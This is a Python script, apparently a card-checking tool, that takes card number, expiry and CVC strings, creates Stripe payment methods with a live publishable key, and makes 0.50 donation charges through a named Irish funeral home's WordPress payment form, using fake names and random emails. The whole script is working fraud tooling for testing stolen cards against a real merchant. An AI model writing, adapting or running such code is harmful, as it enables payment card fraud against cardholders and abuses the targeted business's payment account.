import requests
import random

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy and len(yy) == 4:
            yy = yy.split("20")[1]
        
        # إنشاء جلسة لتوحيد الاتصال
        session = requests.Session()
        
        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)

        # ----------------------
        # Request 1: Stripe API
        # ----------------------
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data_stripe = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'
        
        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
        
        # الحماية من الأخطاء في رد Stripe
        if 'id' not in response.text:
            return f"Stripe Error: {response.json().get('error', {}).get('message', 'Unknown Error')}"
        
        pm = response.json()['id']
        
        # ----------------------
        # Request 2: Charge Site
        # ----------------------
        headers_site = {
            'authority': 'www.corriganfunerals.ie',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.corriganfunerals.ie',
            'referer': 'https://www.corriganfunerals.ie/pay-funeral-account/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data_site = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'pay-funeral-account',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-custom-input[]': ['Waiyan', 'Waiyan', 'Waiyan'],
            'wpfs-card-holder-email': f'Waiyan{random_amount1}{random_amount2}@gmail.com',
            'wpfs-card-holder-name': 'Waiyan',
            'wpfs-stripe-payment-method-id': pm,
        }
        
        response = session.post('https://www.corriganfunerals.ie/cfajax', headers=headers_site, data=data_site)
        
        # الحماية من الأخطاء في رد الموقع
        if 'message' in response.json():
            return response.json()['message']
        elif 'error' in response.text:
            return "Site Error: Request Failed"
        else:
            return "Unknown Response"

    except Exception as e:
        return f"System Error: {str(e)}"
